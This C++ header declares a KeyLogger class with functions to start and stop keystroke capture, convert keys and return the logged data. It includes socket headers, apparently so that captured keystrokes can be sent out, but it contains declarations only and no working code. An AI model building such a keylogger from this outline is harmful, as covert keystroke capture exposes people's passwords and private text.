#pragma once
#include <iostream>
#include <string>
#include <fstream>
#include "SocketManager.h"
#include "WindowsSocket.h"
#include "string.h"
#include "Aclapi.h""
#include <thread>
#include <tchar.h>
class KeyLogger
{
public:
	KeyLogger();
	~KeyLogger();
	static void keyLOG(string input);
	static void stopKeyLogger(HANDLE);
	static string getKeyLoggerData();
	static DWORD WINAPI startKeyLogger(LPVOID param);
	static bool SpecialKeys(int S_Key);
	static char convertKey(int key);
};

